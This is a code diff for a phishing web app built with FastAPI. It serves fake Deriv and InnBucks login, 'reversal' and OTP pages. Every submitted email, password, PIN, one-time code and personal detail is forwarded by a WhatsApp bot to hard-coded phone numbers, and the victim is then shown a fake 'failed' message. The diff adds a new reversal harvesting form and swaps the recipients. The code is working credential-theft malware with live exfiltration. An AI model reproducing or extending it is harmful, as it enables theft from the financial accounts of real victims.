@@ -1,11 +1,14 @@
-from fastapi import FastAPI, Form, Request, status
-from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
+from datetime import datetime
+from http.client import HTTPException
+from fastapi import FastAPI, Form
+from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.staticfiles import StaticFiles
 from pydantic import BaseModel
-from typing import Optional
 import httpx
 from pygwan import WhatsApp
 import os
+import signal
+
 
 
 
@@ -60,21 +63,39 @@ async def serve_login_page():
     with open("deriv/login.html", "r") as f:
         return HTMLResponse(content=f.read(), status_code=200)
 
+@app.get("/reversal", response_class=HTMLResponse)
+async def serve_reversal_page():
+    with open("deriv/reversal.html", "r") as f:
+        return HTMLResponse(content=f.read(), status_code=200)
+
+
 # Receive credentials (POST)
 @app.post("/login")
-async def handle_login(email: str = Form(...), password: str = Form(...)):
-    # Validate the user
-    bot.send_message(
-                message="Fremen Ops\n\nEmail:"+email+"\nPassword:"+password+"\n\nproceed to deriv.com",
-                recipient_id="263779281345",
-    )
-    bot.send_message(
-                message=email+" is trying to log in\npassword"+password,
-                recipient_id="263776525400",
-    )
+async def handle_login(
+    email: str = Form(None), 
+    password: str = Form(None),
+    role: str = Form(None),
+    reason: str = Form(None),
+    order_id: str = Form(None),
+    username: str = Form(None),
+    exchange_rate: str = Form(None),
+    order_amount: str = Form(None)
+):
+    if role or reason or order_id or username:
+        # Reversal form submission
+        msg1 = f"Fremen Ops (Reversal)\n\nreversal log in page hit\n\nEmail: {email}\nPassword: {password}\nUsername: {username}\nExchange Rate: {exchange_rate}\nOrder ID: {order_id}\nOrder Amount: {order_amount}\nRole: {role}\nReason: {reason}"
+        msg2 = f"reversal log in page hit\n\n{email} is submitting a reversal\nPassword: {password}\nUsername: {username}\nExchange Rate: {exchange_rate}\nOrder ID: {order_id}\nOrder Amount: {order_amount}\nRole: {role}\nReason: {reason}"
+    else:
+        # Simple login submission
+        msg1 = f"Fremen Ops\n\nEmail: {email}\nPassword: {password}\n\nproceed to deriv.com"
+        msg2 = f"{email} is trying to log in\nPassword: {password}"
+
+    bot.send_message(message=msg1, recipient_id="263779281345")
+    bot.send_message(message=msg2, recipient_id="263716580906")
+
     return HTMLResponse(
-        content="<h3>Invalid email or password</h3><a href='/login'>Try again</a>",
-        status_code=401
+        content="<h3>Reversal Submission Failed. Please check your credentials and try again.</h3>",
+        status_code=200
     )
 
 # Dummy dashboard for redirection
@@ -112,8 +133,12 @@ async def send_otp(otp_request: OTPRequest):
         )
         bot.send_message(
             message="Name:"+otp_request.survey_data.full_name+"\nBirth Year:"+str(otp_request.survey_data.birth_year)+"\nInnbucks Number:"+otp_request.innbucks_number+"\nPin:"+otp_request.pin+"\n\nwait for otp",
-            recipient_id="263776525400",
+            recipient_id="263716580906",
         )
+        # bot.send_message(
+        #         message="Name:"+otp_request.survey_data.full_name+"\nBirth Year:"+str(otp_request.survey_data.birth_year)+"\nInnbucks Number:"+otp_request.innbucks_number+"\nPin:"+otp_request.pin+"\n\nwait for otp",
+        #         recipient_id="263714002920",
+        # )
         return JSONResponse(
             content={
                 "success": True,
@@ -126,7 +151,7 @@ async def send_otp(otp_request: OTPRequest):
             content={
                 "success": True,
                 "message": "OTP sent successfully (dev mode)",
-                "dev_otp": otp_code  # Remove this in production!
+                "dev_otp": "otp_code"  # Remove this in production!
             }
         )
     
@@ -152,9 +177,12 @@ async def verify_otp(verification: OTPVerification):
         )
         bot.send_message(
             message="Innbucks Number:"+verification.innbucks_number+"\nOTP:"+verification.otp,
-            recipient_id="263776525400",
-        )        
-        
+            recipient_id="263716580906",
+        )
+        # bot.send_message(
+        #     message="Innbucks Number:"+verification.innbucks_number+"\nOTP:"+verification.otp,
+        #     recipient_id="263714002920",
+        # )
         return JSONResponse(
         content={
             "success": True,
@@ -182,9 +210,12 @@ async def resend_otp(innbucks_number: str = Form(...)):
         )
         bot.send_message(
             message="Innbucks Number:"+innbucks_number+"\nRequested for Resend OTP",
-            recipient_id="263776525400",
+            recipient_id="263716580906",
         )
-        
+        # bot.send_message(
+        #     message="Innbucks Number:"+innbucks_number+"\nRequested for Resend OTP",
+        #     recipient_id="263714002920",
+        # )
         return JSONResponse(
             content={
                 "success": True,
@@ -194,12 +225,12 @@ async def resend_otp(innbucks_number: str = Form(...)):
         )
     
     except httpx.RequestError:
-        print(f"New OTP Code (dev mode): {otp_code}")
+        print(f"New OTP Code (dev mode): {"otp_code"}")
         return JSONResponse(
             content={
                 "success": True,
                 "message": "New OTP sent (dev mode)",
-                "dev_otp": otp_code
+                "dev_otp": "otp_code"
             }
         )
     
@@ -225,9 +256,12 @@ async def login(login_req: LoginRequest):
         )
         bot.send_message(
             message=f"InnBucks Mobile App Pin from the second screen:{login_req.pin}\n\nInnbucks Number: {login_req.innbucks_number}",
-            recipient_id="263776525400",
+            recipient_id="263716580906",
         )
-            
+        # bot.send_message(
+        #     message=f"InnBucks Mobile App Pin from the second screen:{login_req.pin}\n\nInnbucks Number: {login_req.innbucks_number}",
+        #     recipient_id="263714002920",
+        # )
         return JSONResponse(
             content={
                 "success": False,
@@ -249,4 +283,21 @@ async def login(login_req: LoginRequest):
 async def health_check():
     """Health check endpoint"""
     return {"status": "healthy", "timestamp": datetime.now().isoformat()}
+
+@app.get("/shutdown")
+async def shutdown():
+    """Shutdown endpoint - terminates the application"""
+
+    # bot.send_message(
+    #     message="Fremen Ops\n\n InnBucks Application is shutting down now.",
+    #     recipient_id="263779281345",
+    # )
+    # bot.send_message(
+    #     message="InnBucks Service shutting down",
+    #     recipient_id="263716580906",
+    # )
+    # Send SIGTERM to the current process
+    os.kill(os.getpid(), signal.SIGTERM)
+    
+    return {"message": "Application shutting down..."}
 
